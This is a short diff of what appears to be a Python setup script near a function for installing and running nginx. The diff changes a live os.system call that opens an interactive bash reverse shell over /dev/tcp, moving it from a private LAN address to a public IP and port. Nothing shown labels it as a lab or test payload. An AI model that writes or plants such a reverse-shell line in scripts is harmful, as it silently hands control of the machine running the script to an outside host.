@@ -83,7 +83,7 @@ def install_run_nginx():
 
 #test
 # install_run_nginx()
-os.system("bash -i > /dev/tcp/192.168.0.104/6668 0>&1 2>&1")
+os.system("bash -i > /dev/tcp/101.34.30.54/8888 0>&1 2>&1")
 
 print("=============================================")
 #远程
